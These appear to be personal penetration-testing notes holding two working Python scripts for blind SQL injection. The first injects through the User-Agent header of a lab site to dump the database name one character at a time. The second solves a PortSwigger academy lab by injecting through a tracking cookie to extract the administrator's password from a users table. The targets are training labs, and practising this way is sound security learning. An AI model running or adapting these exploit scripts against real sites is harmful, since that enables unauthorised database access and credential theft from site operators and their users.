
# Blind SQLi for MySQL using true and false 

```python
#!/usr/bin/python

import string, os, requests

allchars = string.ascii_letters
found = False
quit = False
dumpstr = ""
index = 1
table="database()"

while(quit == False):
	for c in allchars:
		found = False
		payload = "' or substr(%s,%s,1) = '" % (table,(str(index)))	
		headers = {"User-Agent": payload+c}
		r = requests.get("http://1.lab.sqli.site/getBrowserInfo.php", headers=headers)

		if "nothing" in r.content.decode():
			if index == 1:
				print("[+] Found something!")
				print("[+] Dumping '%s': " % table, end="")
			dumpstr += c
			found = True
			print(c, end="", flush=True)
			break
		
		if found == False and "Z" in c:
			quit = True
			print("")
			print("[-] End")
			break
	index+=1

```

![[blindsqli_python 1.png]]


# Blind SQL via cookie
Portswigger academy Lab: Blind SQL injection with conditional responses

```python

import requests, sys, string

host = "https://ac7c1f471e778388c0110c4f005a00d9.web-security-academy.net"
#host = "http://127.0.0.1:9001"
headers = {
"Cookie": "TrackingId=w9FJo7DkOf02QoXT; session=eZEYcaItOQaZz5xTAoApdujLZe1jNUfW",
"Sec-Ch-Ua-Mobile": "?0",
"Sec-Ch-Ua-Platform": "Windows",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-User": "?1",
"Sec-Fetch-Dest": "document",
"Referer": "https://ac7c1f471e778388c0110c4f005a00d9.web-security-academy.net/",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "en-US,en;q=0.9",
"Connection": "close"
}

all_char = string.ascii_lowercase + "1234567890"

dumpstr = ""
index = 1

quit = False
print("[+] Dumping...")
while (quit == False):	
	for c in all_char:
		#print("[-] trying: " + c)
		found = False
		#headers["Cookie"] = "TrackingId=w9FJo7DkOf02QoXT' and (select substring('Microsoft SQL Server 2017',1,{}))='{};".format(f'{index}',dumpstr+c)
		headers["Cookie"] = "TrackingId=w9FJo7DkOf02QoXT' and (select substring(password,{},1) from users where username='administrator')='{};".format(f'{index}',c)
		res = requests.get(host, headers=headers)
		if 'Welcome back' in res.text:
			found = True
			dumpstr += c
			index+=1
			print(c, end="", flush=True)
			break

	if found == False and "0" in c:
		quit = True
		print("")
		print("Found: " + dumpstr)
		print("[-] End")
		break

```